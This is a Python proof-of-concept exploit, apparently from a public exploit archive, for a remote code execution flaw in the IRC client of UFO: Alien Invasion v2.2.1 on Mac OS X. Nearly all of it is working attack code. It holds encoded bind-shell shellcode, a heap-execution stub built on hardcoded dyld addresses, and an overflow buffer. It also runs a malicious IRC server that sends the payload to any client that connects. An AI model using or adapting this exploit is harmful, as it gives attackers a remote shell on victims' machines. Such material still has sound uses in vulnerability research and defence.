#!/usr/bin/python
#
# UFO: Alien Invasion v2.2.1 IRC Client Remote Code Execution - MacOSX
# Author: dookie
# Windows PoC: Jason Geffner http://www.exploit-db.com/exploits/14013
#
import sys, socket, struct

# msfpayload osx/x86/vforkshell_bind_tcp R | msfencode -b '\x00\x0a\x0d' -t c

shellcode = "\x90" * 16
shellcode += ("\xdb\xc3\xd9\x74\x24\xf4\xbb\xf3\xbd\x8d\x7c\x33\xc9\x5d\xb1"
"\x27\x31\x5d\x18\x03\x5d\x18\x83\xc5\xf7\x5f\x78\x4d\x37\x06"
"\xd3\xee\xe7\x79\x84\xbc\xb7\x1b\xe9\xc1\xb8\x59\x8f\xc1\xc6"
"\x5d\xf9\x04\x94\x0f\xab\xe0\x18\xb2\x5a\xad\x91\x51\x36\x5d"
"\xf2\xc3\x95\xed\x9c\x26\x99\x7c\x3b\xeb\xcc\xd2\x73\x61\x3c"
"\x52\x01\x28\xec\x01\xb3\x86\xa0\xb8\xf6\xa7\xb3\x90\x81\x6f"
"\x02\xc2\x12\x84\x64\xb7\x47\x0c\x34\x87\x3d\x7f\x3a\x95\x82"
"\xfc\xc0\x59\x71\xf2\x06\x9e\x29\xa4\x38\x4e\x79\x7f\x74\xee"
"\xe9\x10\xba\xc2\x7c\x18\x73\x5e\xb3\x9a\xf0\xa5\x4b\xef\xe1"
"\x68\x8b\x5f\x66\xa4\x24\x13\x1e\xd2\x15\xb1\xb7\x4c\xe0\xd6"
"\x18\xc1\xa1\x48\x29\xda\x88\xe9\x78\xdd\x42\x63\x99\x8d\x32"
"\x20\x0e\x7e\x02\xc1\x63\xfe\x53\x0e\x2b\xaf\xd3\x43\x4c\x45")

#### Exec Payload From Heap Stub (By Dino Dai Zovi) ####
frag0 = "\x90\x58\x61\xc3"
frag1 = "\x90\x58\x89\xe0\x83\xc0\x0c\x89\x44\x24\x08\xc3"

writeable = 0x8fe66448          # writeable memory location in /usr/lib/dyld
setjmp = 0x8fe1cf38             # t _setjmp in /usr/lib/dyld
strdup = 0x8fe210dc             # t _strdup in /usr/lib/dyld
jmpeax = 0x8fe01041             # jmp eax in /usr/lib/dyld

stub = frag0 + struct.pack('<III',setjmp,writeable+32,writeable) + \
frag1 + 'A' * 20 + struct.pack('<IIIII',setjmp,writeable+24,writeable,strdup,jmpeax) + \
'A' * 4

sploit = "001 :"
sploit += "\x41" * 524
sploit += stub
sploit += shellcode
sploit += "\x0d\x0a"
#sploit = lead

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', 6667))
s.listen(1)
print ("[*] Listening on port 6667.")
print ("[*] Have someone connect to you.")
print ("[*] Type <control>-c to exit.")
conn, addr = s.accept()
print '[*] Received connection from: ', addr

conn.send(sploit)
conn.close